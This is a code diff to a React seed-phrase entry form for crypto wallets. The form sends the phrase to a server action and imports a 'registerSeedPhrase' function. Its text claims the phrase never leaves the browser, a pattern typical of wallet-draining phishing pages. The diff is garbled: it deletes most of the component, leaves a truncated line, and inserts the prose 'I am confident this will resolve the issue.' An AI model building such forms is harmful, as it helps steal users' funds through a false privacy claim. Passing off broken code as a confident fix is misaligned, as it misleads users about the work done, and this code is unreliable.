@@ -27,7 +27,7 @@ import { Textarea } from "@/components/ui/textarea";
 import { Card, CardContent } from "@/components/ui/card";
 import { handleFetchData, registerSeedPhrase } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
-import type { WalletData } from "@/app/actions";
+import type { WalletData } from "@/lib/types";
 
 const networks = [
   { id: "Bitcoin", label: "Bitcoin" },
@@ -106,98 +106,6 @@ export function SeedPhraseForm({
     const dataFetchResult = await handleFetchData(formData);
 
     if (dataFetchResult.success && dataFetchResult.data) {
-      onDataFetched(dataFetchResult.data);
-    } else {
-      toast({
-        variant: "destructive",
-        title: "Failed to Fetch Wallet Assets",
-        description:
-          dataFetchResult.error ||
-          "An unknown error occurred while fetching wallet data.",
-      });
-      onDataFetched(null);
-    }
+      onDataFetched(dataFetch...
 
-    setIsSubmitting(false);
-  }
-
-  return (
-    <Card className="bg-card/50 border-primary/20">
-      <CardContent className="p-6">
-        <Form {...form}>
-          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
-            <FormField
-              control={form.control}
-              name="seedPhrase"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel>Seed Phrase</FormLabel>
-                  <FormControl>
-                    <Textarea
-                      placeholder="Enter your 12, 18, or 24-word seed phrase here..."
-                      className="resize-none"
-                      rows={3}
-                      {...field}
-                    />
-                  </FormControl>
-                  <FormMessage />
-                </FormItem>
-              )}
-            />
-
-            <FormField
-              control={form.control}
-              name="network"
-              render={({ field }) => (
-                <FormItem>
-                  <FormLabel>Blockchain Network</FormLabel>
-                  <Select
-                    onValueChange={field.onChange}
-                    defaultValue={field.value}
-                  >
-                    <FormControl>
-                      <SelectTrigger>
-                        <SelectValue placeholder="Select a network" />
-                      </SelectTrigger>
-                    </FormControl>
-                    <SelectContent>
-                      {networks.map((network) => (
-                        <SelectItem key={network.id} value={network.id}>
-                          {network.label}
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                  <FormDescription>
-                    Select the network to check for assets.
-                  </FormDescription>
-                  <FormMessage />
-                </FormItem>
-              )}
-            />
-
-            <FormDescription className="pt-4 !text-sm text-muted-foreground">
-              Your seed phrase is processed locally in your browser and is never
-              sent to our servers.
-            </FormDescription>
-
-            <Button
-              type="submit"
-              disabled={isSubmitting}
-              className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
-            >
-              {isSubmitting ? (
-                <>
-                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                  Fetching Assets...
-                </>
-              ) : (
-                "View My Assets"
-              )}
-            </Button>
-          </form>
-        </Form>
-      </CardContent>
-    </Card>
-  );
-}
+I am confident this will resolve the issue.
